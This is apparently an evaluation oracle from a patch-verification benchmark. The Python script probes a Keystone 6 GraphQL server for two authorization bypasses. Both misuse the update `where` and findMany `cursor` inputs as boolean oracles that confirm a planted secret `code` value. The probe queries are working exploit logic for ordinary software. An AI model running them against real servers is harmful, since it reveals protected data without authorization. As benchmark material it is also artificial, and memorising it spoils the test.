#!/usr/bin/env python3
"""
PatchClosure-Bench value-oracle for keystone6-cve-2026-33326.

Benign authz VALUE-ORACLE over EXTERNAL HTTP GraphQL against a REAL
@keystone-6/core server. The `Secret.code` field is:
  * isIndexed:'unique'        -> present in SecretWhereUniqueInput (cursor / update `where`)
  * isFilterable: () => false -> a FUNCTION guard (the advisory-affected config)
  * access.read: denyAll      -> value can NEVER be SELECTed directly (reads come back null)

So the ONLY way to learn/confirm a `code` value is to abuse a filter/cursor input
as a boolean oracle. We confirm a PLANTED flag (${PCB_FLAG}) -- we never exfiltrate
anything we did not seed. "reached" == the forbidden input on a non-filterable field
successfully confirmed the planted value.

Two probes:
  probe_original(base, flag)  CVE-2025-46720: update/delete multi-unique `where`
                              value-oracle  ->  updateSecret(where:{id, code})
  probe_cursor(base, flag)    CVE-2026-33326: findMany `cursor` (UniqueWhere)
                              value-oracle  ->  secrets(cursor:{code})

Each returns "REACHED" (oracle confirmed the flag via the forbidden input),
"BLOCKED" (isFilterable guard fired: KS_FILTER_DENIED), or "MISS".
"""
import json
import sys
import urllib.request
import urllib.error

TIMEOUT = 20


def gql(base, query):
    url = base.rstrip("/") + "/api/graphql"
    body = json.dumps({"query": query}).encode()
    req = urllib.request.Request(
        url, data=body, headers={"content-type": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
            return json.loads(r.read().decode())
    except urllib.error.HTTPError as e:
        try:
            return json.loads(e.read().decode())
        except Exception:
            return {"errors": [{"message": "HTTP %s" % e.code}]}


def _filter_denied(resp):
    for e in resp.get("errors", []) or []:
        ext = e.get("extensions", {}) or {}
        if ext.get("code") == "KS_FILTER_DENIED":
            return True
        if "filter' operations" in (e.get("message") or ""):
            return True
    return False


def all_ids(base):
    resp = gql(base, "{ secrets{ id } }")
    return [r["id"] for r in ((resp.get("data") or {}).get("secrets") or [])]


def probe_original(base, flag):
    """CVE-2025-46720 update multi-unique-`where` value oracle.

    updateSecret(where:{id:<known>, code:<guess>}) -- on the vulnerable version
    only the first unique key (id) is access-checked, so `code` is smuggled into
    the match. Correct guess -> record matched -> mutation returns the item.
    Wrong guess -> no match -> KS_ACCESS_DENIED. Guarded version -> KS_FILTER_DENIED.

    Record ids are public (`secrets{id}`), but `code` is unreadable; we enumerate
    ids and confirm which one carries the planted flag, exactly as an attacker would.
    """
    ids = all_ids(base)
    if not ids:
        return "MISS", {"reason": "no records"}
    matched_id = None
    for rid in ids:
        good = (
            'mutation{ updateSecret(where:{id:"%s", code:"%s"}, '
            'data:{label:"seed"}){ id } }' % (rid, flag)
        )
        r_good = gql(base, good)
        if _filter_denied(r_good):
            return "BLOCKED", {"guess": "correct", "resp": r_good}
        if ((r_good.get("data") or {}).get("updateSecret") or {}).get("id") == rid:
            matched_id = rid
            break
    if not matched_id:
        return "MISS", {"reason": "no id matched the flag", "ids": ids}
    # negative control: same id, deliberately wrong code -> must NOT match
    bad = (
        'mutation{ updateSecret(where:{id:"%s", code:"%s-NOPE"}, '
        'data:{label:"seed"}){ id } }' % (matched_id, flag)
    )
    r_bad = gql(base, bad)
    miss_bad = ((r_bad.get("data") or {}).get("updateSecret")) is None
    if miss_bad:
        return "REACHED", {"correct_matched_id": matched_id, "wrong_denied": True}
    return "MISS", {"matched_id": matched_id, "bad": r_bad}


def probe_cursor(base, flag):
    """CVE-2026-33326 findMany `cursor` (UniqueWhere) value oracle.

    secrets(cursor:{code:<guess>}, take:1) -- cursor bypasses the isFilterable check
    on the incomplete-fix version. Correct guess -> returns the record; wrong guess
    -> empty list. Fixed version -> KS_FILTER_DENIED.
    """
    good = (
        '{ secrets(cursor:{code:"%s"}, take:1, orderBy:{id:asc}){ id } }' % flag
    )
    bad = (
        '{ secrets(cursor:{code:"%s-NOPE"}, take:1, orderBy:{id:asc}){ id } }' % flag
    )
    r_good = gql(base, good)
    if _filter_denied(r_good):
        return "BLOCKED", {"guess": "correct", "resp": r_good}
    r_bad = gql(base, bad)
    hit_good = len((r_good.get("data") or {}).get("secrets") or []) > 0
    miss_bad = len((r_bad.get("data") or {}).get("secrets") or []) == 0
    if hit_good and miss_bad:
        return "REACHED", {"correct_returned": True, "wrong_empty": True}
    return "MISS", {"good": r_good, "bad": r_bad}


def main():
    if len(sys.argv) < 3:
        print("usage: oracle.py <base_url> <flag> [original|cursor]")
        sys.exit(2)
    base, flag = sys.argv[1], sys.argv[2]
    which = sys.argv[3] if len(sys.argv) > 3 else "both"
    out = {}
    if which in ("original", "both"):
        v, d = probe_original(base, flag)
        out["original"] = {"verdict": v, "detail": d}
    if which in ("cursor", "both"):
        v, d = probe_cursor(base, flag)
        out["cursor"] = {"verdict": v, "detail": d}
    print(json.dumps(out, indent=2))


if __name__ == "__main__":
    main()
